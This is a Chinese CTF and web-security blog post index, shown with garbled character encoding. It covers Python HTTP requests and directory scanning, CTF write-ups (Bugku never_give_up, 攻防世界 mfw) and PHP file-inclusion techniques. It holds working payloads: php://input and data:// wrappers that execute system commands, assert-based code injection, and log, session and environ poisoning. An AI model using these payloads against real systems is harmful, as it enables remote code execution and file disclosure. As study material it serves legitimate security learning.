Pythonä½¿ç”¨HTTPè¯·æ±‚\n\n###### GETè¯·æ±‚\n\nä¸å¸¦å‚æ•°`requests.get(url)`\n\nå¸¦å‚æ•°`requests.get(url=url,params={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\nè¿”å›çš„å¯¹è±¡r.urlè·å–url\n\n###### POSTè¯·æ±‚\n\nä¸å¸¦å‚æ•°`requests.post(url)`\n\nå¸¦å‚æ•°`requests.post(url=url,data={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n###### è‡ªå®šä¹‰è¯·æ±‚å¤´\n\nheaders={key1:value1,key2:value2}\n\nrequests.get(url=url,headers=headers)\n\n###### å…¶ä»–è¯·æ±‚\n\nrequests.put(url,data)\n\nrequests.delete(url)\n\nrequests.head(url)\n\nrequests.options(url)\n\n## Pythonå¤„ç†HTTPå“åº”\n\n**è·å–ç›¸åº”çŠ¶æ€ç ï¼š**r.status_code\n\n**è·å–å“åº”æ–‡æœ¬ï¼š**r.contentï¼ˆè·å–åˆ°äºŒè¿›åˆ¶å†…å®¹ï¼‰r.textï¼ˆè·å–åŸå§‹æ–‡æœ¬ä»£ç ï¼‰\n\n**è·å–ç›¸åº”å¤´ï¼š**r.headers\n\n**è·å–è¯·æ±‚å¤´ï¼š**r.reuqests.headers\n\n**è·å–è¯·æ±‚URLï¼š**r.url\n\n**è·å–Cookieï¼š**r.cookies\n\n## Pythonè®¾ç½®HTTPä»£ç†\n\n**ä»£ç†è®¾ç½®ï¼š**httpå’Œhttps:`proxies={'http':'http://ä»£ç†æœåŠ¡å™¨:ä»£ç†ç«¯å£','https':'https://ä»£ç†æœåŠ¡å™¨:ä»£ç†ç«¯å£'}`\n\n**å‚æ•°è®¾ç½®ï¼š**`proxies=proxies,verfiy=False`\n\n## Pythonä¼šè¯ç¼–ç¨‹\n\né€šè¿‡Set-Cookieè®¾ç½®ä¸€ä¸ªcookieå€¼\n\nä½¿ç”¨`s=requesets.Session()`å»ºç«‹ä¸€ä¸ªæ–°çš„ç©ºä¼šè¯\n\n`r=s.get(url)`æ¥åœ¨ä¼šè¯ä¸­å‘èµ·ä¸ªä½“è¯·æ±‚\n\n## Pythonåˆ¶ä½œç›®å½•æ‰«æå·¥å…·\n\n###### ç›®å½•æ‰«æåŸç†\n\n1ã€è¯»å–å­—å…¸æ–‡ä»¶æ‹¼æ¥URL\n\n2ã€é€šè¿‡getè¯·æ±‚è®¿é—®URL\n\n3ã€è·å–çŠ¶æ€ç åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨\n\n###### å­—å…¸æ–‡ä»¶è¯»å–\n\n1ã€`with open(\"filename.txt\",\"r\") as f:`\n\n2ã€è¯»å–æ–¹å¼ï¼š\n\n- `f.readline()//è¯»å–ä¸€è¡Œ`\n- `f.readlines()//é€è¡Œè¯»å–åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­`\n- `f.read(å­—èŠ‚æ•°)//æŒ‰å­—èŠ‚è¯»`\n- `line.strip()//å»é™¤ç©ºè¡Œ`\n\n3ã€`f.close()`å…³é—­æ–‡ä»¶æµ\n\n4ã€sysåº“ä¸­çš„sys.argv[0]ä¸ºå½“å‰pythonæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œsys.argv[1]ä¸ºä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°\n\n5ã€User-Agenté€šè¿‡æŠ“åŒ…å…ˆè·å–çœŸå®çš„User-Agentï¼Œå†é€šè¿‡headerså­—å…¸ä¼ å…¥getè¯·æ±‚\n\n## IIS PUTæ¼æ´\n\nIISä¸­æ‹“å±•å·¥å…·WebDAVæ”¯æŒHTTPæ–¹æ³•ï¼Œä¹Ÿæä¾›äº†ä¸€äº›å…¶ä»–åŠŸèƒ½å¼ºå¤§çš„æ–¹æ³•ï¼ˆMoveï¼‰ï¼Œä½¿å¾—å¼€å¯WebDAVå¯ä»¥ç›´æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶\n\n**æ¢æµ‹æ–¹æ³•ï¼š**é€šè¿‡HTTPä¸­optionsæ–¹æ³•å¯ä»¥æ¢æµ‹å‡ºæœåŠ¡å™¨æ”¯æŒçš„HTTPæ–¹æ³•\n\n**æ¢æµ‹è¿‡ç¨‹ï¼š**\n\n- ç¡®å®šç›®æ ‡ä¸»æœº\n- ä½¿ç”¨HTTP optionsæ–¹æ³•æ¢æµ‹\n- æŸ¥çœ‹è¿”å›ç»“æœä¸­æ˜¯å¦å­˜åœ¨MOVE PUT\n- æŸ¥çœ‹å“åº”å¤´ä¸­çš„PUBLICå±æ€§\n\n## æ¢æµ‹æœåŠ¡å™¨ä¿¡æ¯\n\nç›¸åº”å¤´ä¸­çš„Serverï¼šæœåŠ¡å™¨ä¸­é—´ä»¶å±æ€§\n\nX-Powered-Byï¼šæœåŠ¡å™¨è„šæœ¬æŠ€æœ¯\n\n## Pythonåˆ¶ä½œæ¼æ´æ£€æµ‹å·¥å…·\n\né¦–å…ˆäº†è§£æ¼æ´äº§ç”ŸåŸç†ï¼Œæ ¹æ®æ¼æ´åŸç†å†™å‡ºå¯¹åº”çš„POCä»£ç æ¥éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨\n\n## æ„å»ºç«™ç‚¹åœ°å›¾\n\næµ‹è¯•Web Appçš„é¦–è¦ä»»åŠ¡å°±æ˜¯è·å–ç«™ç‚¹å®Œæ•´çš„ç›®å½•å’Œæ–‡ä»¶\n\n###### æŠ€æœ¯ç§ç±»ï¼šå»ºè®®ä½¿ç”¨ä¸¤ç§æ–¹å¼åŒæ—¶è¿›è¡Œ\n\n1ã€é€šè¿‡åŸºäºå­—å…¸çš„ç›®å½•æ–‡ä»¶æ‰«æ\n\n2ã€é€šè¿‡åŸºäºç½‘ç»œçˆ¬è™«çš„æŠ€æœ¯ï¼ˆå¯é€šè¿‡requestsåº“æ„å»ºï¼Œä½†æ˜¯å¾ˆå¤æ‚ï¼Œæœ‰scrapyåº“å¯ç”¨äºæ„å»ºçˆ¬è™«ï¼‰\n\n3ã€é€šè¿‡Burpsuiteæ„å»ºç½‘ç«™åœ°å›¾\n","tags":["web"]},{"title":"Bugku never_give_up","url":"/2022/01/19/Bugku-never-give-up/","content":"\n# Bugku never_give_up\n\næŸ¥çœ‹æºä»£ç å¥½çš„æç¤ºè®¿é—®1p.html\n\n```html\n<HTML>\n<HEAD>\n    <SCRIPT LANGUAGE=\"Javascript\">\n    //\n\n\n    var Words = \"%3Cscript%3Ewindow.location.href%3D'http%3A%2F%2Fwww.bugku.com'%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E\"\n    function OutWord()\n    {\n        var NewWords;\n        NewWords = unescape(Words);\n        document.write(NewWords);\n    }\n    OutWord();\n    // -->\n    </script>\n</HEAD>\n<BODY></BODY>\n</HTML>\n\n\n```\n\n<!--more-->\n\næŸ¥çœ‹å‡½æ•°å¾—çŸ¥æ˜¯å°†`Words`ä¸­çš„å†…å®¹è§£ç åæ‰§è¡Œ\n\nç»è¿‡URLè§£ç ä¸base64è§£ç åhello.phpçš„ä»£ç å¦‚ä¸‹\n\n```php+HTML\n<script>window.location.href='http://www.bugku.com';</script> \n<!--\";if(!$_GET['id'])\n{\n\theader('Location: hello.php?id=1');\n\texit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.'))\n{\n\techo 'no no no no no no no';\n\treturn ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n{\n\t$flag = \"flag{***********}\"\n}\nelse\n{\n\tprint \"never never never give up !!!\";\n}\n?>-->\n```\n\nä¸»è¦åˆ¤æ–­è¯­å¥ä¸ºï¼š\n\n```php\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n```\n\ndataçš„æ•°æ®æ¥è‡ªfile_get_contentså‡½æ•°ï¼Œå¯ä»¥é€šè¿‡phpä¼ªåè®®ä¸­çš„php://inputæ¥ä¼ªé€ \n\nid==0ä¸ºå¼±ç›¸ç­‰ï¼Œè€Œç”±äºå‰é¢åˆ¤æ–­idæ‰€ä»¥idä¸èƒ½ç›´æ¥ç­‰äº0ï¼Œå¯ä»¥è®©id=%00ï¼Œ.ï¼Œ0e1ï¼Œå­—æ¯å­—ç¬¦ç­‰ç»•è¿‡\n\nbé•¿åº¦å¤§äº5å¹¶ä¸”é¦–ä½ä¸ä¸º4ï¼Œå¹¶ä¸”\"1114\"å­—ç¬¦ä¸²ä¸­å­˜åœ¨ç¬¦åˆ\"111\".substr($b,0,1)è¯¥è§„åˆ™çš„å†…å®¹\n\næŸ¥è¯¢æ­£åˆ™è¡¨è¾¾å¼çš„ç‰¹æ®Šå­—ç¬¦å¾—çŸ¥ï¼Œæ­£åˆ™ä¸­çš„ç‰¹æ®Šå­—ç¬¦å¦‚ä¸‹\n\n|      | ç‰¹æ®Šå­—ç¬¦                                             |\n| ---- | ---------------------------------------------------- |\n| +    | åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡                         |\n| .    | åŒ¹é…é™¤æ¢è¡Œç¬¦ \\n ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦                     |\n| *    | åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡                         |\n| ?    | åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–ä¸€æ¬¡ï¼Œæˆ–æŒ‡æ˜ä¸€ä¸ªéè´ªå©ªé™å®šç¬¦ |\n|      |                                                      |\n\næ‰€ä»¥è®©bå­—ç¬¦ä¸²å¼€å¤´å­—ç¬¦ä¸ºä¸Šè¿°ä»»ä¸€å­—ç¬¦å°±è¡Œ\n\npayloadï¼š\n\n```\n?id=a&b=*12345&a=php://input\nbody:\nbugku is a nice plateform!\n```\n\næ‹¿åˆ°flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/NGV.png)\n","tags":["CTF","web"]},{"title":"é€»è¾‘æ¼æ´","url":"/2022/01/19/é€»è¾‘æ¼æ´/","content":"\n# é€»è¾‘æ¼æ´\n\n1ã€å¯†ç æ‰¾å›ï¼Œä»»æ„ç”¨æˆ·æ³¨å†Œ\n\næ³¨å†Œæ—¶æŠ“åŒ…è¯·æ±‚å¤´å†…å®¹ï¼Œå¹¶ä¸”åœ¨å¾—åˆ°è¿”å›é“¾æ¥æ—¶å¯¹æ¯”å†…å®¹ï¼Œæ‰¾å‡ºç¼–è§£ç æ–¹å¼\n\n<!--more-->\n\n2ã€æ”¯ä»˜æ¼æ´\n\næŠ“åŒ…ä¿®æ”¹ä»˜æ¬¾é‡‘é¢\n\n3ã€è¶Šæƒ\n\né€šè¿‡ç›´æ¥æ›´æ”¹URLä¸­çš„è¯·æ±‚å€¼ç›´æ¥æŸ¥çœ‹æˆ–æ›´æ”¹ä»–äººæ•°æ®\n\n4ã€\n","tags":["CTF","web"]},{"title":"æ”»é˜²ä¸–ç•Œmfw","url":"/2022/01/19/æ”»é˜²ä¸–ç•Œmfw/","content":"\n# æ”»é˜²ä¸–ç•Œmfw\n\nè¿›å…¥ç½‘é¡µæŸ¥çœ‹aboutå†…å®¹ï¼Œå‘ç°ç½‘é¡µä½¿ç”¨gitè¿›è¡Œç‰ˆæœ¬ç®¡ç†\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw1.png)\n\nç½‘ç«™ååŠ .gitå‘ç°å­˜åœ¨gitæ³„æ¼![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw2.png)\n\n<!--more-->\n\nä½¿ç”¨GitHackè„šæœ¬è·å¾—æºç \n\n```php\n<?php\n\nif (isset($_GET['page'])) {\n\t$page = $_GET['page'];\n} else {\n\t$page = \"home\";\n}\n\n$file = \"templates/\" . $page . \".php\";\n\n// I heard '..' is dangerous!\nassert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");\n\n// TODO: Make this look nice\nassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");\n\n?>\n<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<meta charset=\"utf-8\">\n\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\t\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n\t\t\n\t\t<title>My PHP Website</title>\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css\" />\n\t</head>\n\t<body>\n\t\t<nav class=\"navbar navbar-inverse navbar-fixed-top\">\n\t\t\t<div class=\"container\">\n\t\t    \t<div class=\"navbar-header\">\n\t\t    \t\t<button type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#navbar\" aria-expanded=\"false\" aria-controls=\"navbar\">\n\t\t            \t<span class=\"sr-only\">Toggle navigation</span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t            \t<span class=\"icon-bar\"></span>\n\t\t          \t</button>\n\t\t          \t<a class=\"navbar-brand\" href=\"#\">Project name</a>\n\t\t        </div>\n\t\t        <div id=\"navbar\" class=\"collapse navbar-collapse\">\n\t\t          \t<ul class=\"nav navbar-nav\">\n\t\t            \t<li <?php if ($page == \"home\") { ?>class=\"active\"<?php } ?>><a href=\"?page=home\">Home</a></li>\n\t\t            \t<li <?php if ($page == \"about\") { ?>class=\"active\"<?php } ?>><a href=\"?page=about\">About</a></li>\n\t\t            \t<li <?php if ($page == \"contact\") { ?>class=\"active\"<?php } ?>><a href=\"?page=contact\">Contact</a></li>\n\t\t\t\t\t\t<!--<li <?php if ($page == \"flag\") { ?>class=\"active\"<?php } ?>><a href=\"?page=flag\">My secrets</a></li> -->\n\t\t          \t</ul>\n\t\t        </div>\n\t\t    </div>\n\t\t</nav>\n\t\t\n\t\t<div class=\"container\" style=\"margin-top: 50px\">\n\t\t\t<?php\n\t\t\t\trequire_once $file;\n\t\t\t?>\n\t\t\t\n\t\t</div>\n\t\t\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js\" />\n\t\t<script src=\"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js\" />\n\t</body>\n</html>\n\n```\n\nassert()å‡½æ•°å°†å†…å®¹å½“ä½œphpå‘½ä»¤æ‰§è¡Œï¼Œstrpos()å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²1ä¸­å­—ç¬¦ä¸²2é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå°è¯•é€šè¿‡é—­åˆæ„é€ å‘½ä»¤\n\n```php\nassert(\"strpos('$file', '..') === false\")\n```\n\né¦–å…ˆä½¿ç”¨')é—­åˆstrposå‡½æ•°è€Œåè¾“å…¥.å‘½ä»¤æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œæœ€ååŠ å…¥//æ³¨é‡Šåé¢å†…å®¹\n\nå®Œæ•´payloadï¼š\n\n```\n?page=').phpinfo();//\n```\n\nä¼ å…¥ååŸå‡½æ•°å˜ä¸º\n\n```php\nassert(\"strpos('').phpinfo();//', '..') === false\")\n```\n\næ‰§è¡ŒæˆåŠŸ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw3.png)\n\néšåé€šè¿‡system()å‡½æ•°å¾—åˆ°flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/mfw4.png)\n","tags":["CTF","web"]},{"title":"æ–‡ä»¶åŒ…å«","url":"/2022/01/18/æ–‡ä»¶åŒ…å«/","content":"\n# æ–‡ä»¶åŒ…å«\n\nå¸¸è§çš„æ–‡ä»¶åŒ…å«æ¼æ´å‡½æ•°ï¼šinclude()ï¼Œrequire()\n\n### æœ¬åœ°åŒ…å«\n\n#### åˆ©ç”¨æ–¹å¼ï¼š\n\n###### 1ã€php://inputï¼š\n\n```\n?file=php://input\nè¯·æ±‚ä½“å†…ä¸ºPHPä»£ç ï¼š<?php phpinfo(); ?>\n```\n\nphp://inputå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://inputï¼ŒåŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\né‡åˆ°file_get_contents()è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ã€‚\n\n<!--more-->\n\n###### 2ã€php://filterï¼š\n\n```\n?file=php://filter/rescource=xxx.php\nä»¥base64ç¼–ç è¯»å–\n?file=php://filter/read=convert.base64-encode/resource=xxx.php\n```\n\nphp://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚\n\n###### 3ã€zip://ï¼š\n\n```\n?file=zip://[å‹ç¼©åŒ…ç»å¯¹è·¯å¾„]#[å‹ç¼©åŒ…å†…æ–‡ä»¶]\n```\n\nzip:// å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\n- zip://ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚\n- è¦ç”¨#åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç %23\n- åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚\n- ç›¸åŒçš„ç±»å‹çš„è¿˜æœ‰zlib://å’Œbzip2://\n\n###### 4ã€data://ï¼š\n\n```\n?file=data://[<MIME-type>][;cherset=<encoding>][;base64],<data>\nä¸‹é¢ä¸ºç¤ºä¾‹\n?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=\n```\n\ndata:// åŒæ ·ç±»ä¼¼ä¸php://inputï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\n###### 5ã€phar//ï¼š\n\n```\n?file=phar://å‹ç¼©åŒ…è·¯å¾„ï¼ˆç›¸å¯¹ç»å¯¹éƒ½å¯ï¼‰/å‹ç¼©åŒ…å†…æ–‡ä»¶\n```\n\néœ€è¦phar://æœ‰ç‚¹ç±»ä¼¼zip://åŒæ ·å¯ä»¥å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚\n\n#### å¯ä¾›åŒ…å«çš„å†…å®¹ï¼š\n\n###### 1ã€åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶ï¼š\n\n###### **æ¡ä»¶ï¼šå¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»å¹¶ä¸”çŸ¥é“æ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨ç›®å½•**\n\n**æ³¨æ„äº‹é¡¹ï¼š**ä¸€èˆ¬æƒ…å†µä¸‹æ—¥å¿—å­˜å‚¨ç›®å½•è¢«ä¿®æ”¹ï¼Œéœ€è¦è¯»å–æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼ˆhttpdï¼Œconfï¼Œnginxï¼Œconf...ï¼‰æˆ–è€…æ ¹æ®phpinfo()ä¸­çš„ä¿¡æ¯æ¥å¾—çŸ¥ã€‚è¿˜æœ‰å°±æ˜¯æ—¥å¿—è®°å½•çš„ä¿¡æ¯éƒ½å¯ä»¥è¢«è°ƒæ•´ï¼Œæ¯”å¦‚è®°å½•æŠ¥é”™çš„ç­‰çº§æˆ–è€…å†…å®¹æ ¼å¼ã€‚\n\nApacheè¿è¡Œåä¸€èˆ¬é»˜è®¤ä¼šç”Ÿæˆä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼ŒWindosä¸‹æ˜¯access.logï¼ˆè®¿é—®æ—¥å¿—ï¼‰å’Œerror.log(é”™è¯¯æ—¥å¿—)ï¼ŒLinuxä¸‹æ˜¯access_logå’Œerror_logï¼Œè®¿é—®æ—¥å¿—æ–‡ä»¶è®°å½•äº†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å’ŒæœåŠ¡å™¨å“åº”çš„ç›¸å…³ä¿¡æ¯ã€‚\n\nå¦‚æœè®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºæ—¶ï¼Œå¦‚http://www.xxxx.com/<?php phpinfo(); ?>,åˆ™ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ï¼Œä½†æ˜¯ä»£ç ä¸­çš„æ•æ„Ÿå­—ç¬¦ä¼šè¢«æµè§ˆå™¨è½¬ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpsuitç»•è¿‡ç¼–ç ï¼Œå°±å¯ä»¥æŠŠ<?php phpinfo(); ?> å†™å…¥apacheçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åå¯ä»¥é€šè¿‡åŒ…å«æ—¥å¿—æ–‡ä»¶æ¥æ‰§è¡Œæ­¤ä»£ç ï¼Œä½†å‰ææ˜¯ä½ å¾—çŸ¥é“apacheæ—¥å¿—æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„ï¼Œæ‰€ä»¥ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®‰è£…apacheæ—¶å°½é‡ä¸è¦ä½¿ç”¨é»˜è®¤è·¯å¾„ã€‚\n\nå¯ä»¥æ”¾åœ¨User-Agentä¸­\n\n###### 2ã€åŒ…å«SESSION\n\n**æ¡ä»¶ï¼š**æ‰¾åˆ°Sessionå†…çš„å¯æ§å˜é‡ï¼Œå¹¶ä¸”Sessionæ–‡ä»¶å¯è¯»å†™ï¼Œå¹¶ä¸”çŸ¥é“å­˜å‚¨è·¯å¾„ï¼ŒPHPä¸­SESSIONæ–‡ä»¶ä¿å­˜è·¯å¾„å¯ä»¥åœ¨phpinfoä¸­çœ‹åˆ°\n\n**å¸¸è§è·¯å¾„ï¼š**\n\n/var/lib/php/sess_PHPSESSID\n/var/lib/php/sess_PHPSESSID\n/tmp/sess_PHPSESSID\n/tmp/sessions/sess_PHPSESSID\nsessionæ–‡ä»¶æ ¼å¼ï¼š sess_[phpsessid] ï¼Œè€Œ phpsessid åœ¨å‘é€çš„è¯·æ±‚çš„ cookie å­—æ®µä¸­å¯ä»¥çœ‹åˆ°ã€‚\n\n\n###### 3ã€åŒ…å«/pros/self/environ\n\n**å†…å®¹ï¼š**proc/self/environä¸­ä¼šä¿å­˜user-agentå¤´ï¼Œå¦‚æœåœ¨user-agentä¸­æ’å…¥phpä»£ç ï¼Œåˆ™phpä»£ç ä¼šè¢«å†™å…¥åˆ°environä¸­ï¼Œä¹‹åå†åŒ…å«å®ƒï¼Œå³å¯ã€‚\n\n**æ¡ä»¶ï¼š**phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚\n\n###### 4ã€åŒ…å«ä¸´æ—¶æ–‡ä»¶\n\nphpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨C:\\Winsdows\\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚\n\nç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚\n\nå¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚\n","tags":["CTF","web"]},{"title":"XSS","url":"/2022/01/13/XSSæ³¨å…¥/","content":"\n# XSS\n\n#### å†…å®¹ï¼š\n\nå…¨ç§°ä¸ºè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯ä¸€ç§Webåº”ç”¨ç¨‹åºçš„æ¼æ´ï¼Œæ¥è‡ªç”¨æˆ·çš„ä¸å¯ä¿¡æ•°æ®åœ¨æ²¡æœ‰éªŒè¯çš„æƒ…å†µä¸‹è¢«åº”ç”¨ç¨‹åºè¿›è¡Œäº†å¤„ç†ï¼Œæ²¡æœ‰æ­£ç¡®è½¬ä¹‰ï¼ˆescapeï¼‰æˆ–ç¼–ç ï¼ˆencodeï¼‰åå°„å›æµè§ˆå™¨ï¼Œå¯¼è‡´æµè§ˆå™¨å¼•æ“æ‰§è¡Œäº†éé¢„æœŸä»£ç \n\n#### ç±»å‹ï¼š\n\n###### åå°„æ€§ï¼šç›´æ¥ä¼ è¾“ä»£ç åï¼Œç»è¿‡åç«¯æ¸²æŸ“ä»£ç ç›´æ¥æ”¾å…¥äº†å‰ç«¯é¡µé¢ä¸­\n\n###### å­˜å‚¨å‹ï¼šå°†ä»£ç ç»è¿‡åç«¯å¤„ç†å­˜å…¥æ•°æ®åº“ï¼Œå½“ä»æ•°æ®åº“æŸ¥è¯¢ç»å‰ç«¯æ¸²æŸ“åä»£ç è¢«æ‰§è¡Œ\n\n###### 